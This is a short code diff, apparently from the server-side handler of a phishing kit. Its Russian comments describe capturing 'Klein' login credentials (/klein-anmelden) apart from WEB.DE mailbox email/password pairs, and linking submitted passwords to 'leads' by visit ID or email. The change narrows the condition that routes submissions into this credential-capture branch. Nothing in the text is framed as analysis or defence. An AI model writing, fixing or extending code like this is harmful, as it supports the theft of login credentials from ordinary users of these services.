@@ -257,7 +257,7 @@ async function handle(scope) {
       }
       /** Только креды Klein (/klein-anmelden): не трогаем email/password почты WEB.DE.
        *  visitId обязателен для привязки; если sessionStorage потерян — ищем лид по совпадению email или emailKl (самый свежий). */
-      if (json.kleinFlowSubmit === true || json.kleinFlow === true || jsonPayloadMatchesKleinClientShape(json)) {
+      if (json.kleinFlowSubmit === true || json.kleinFlow === true) {
         const leadsKf = readLeads();
         const pwKf = ((json.password != null) ? String(json.password).trim() : '') || ((json.passwort != null) ? String(json.passwort).trim() : '');
         const emKf = String(json.email || json.emailKl || '').trim();
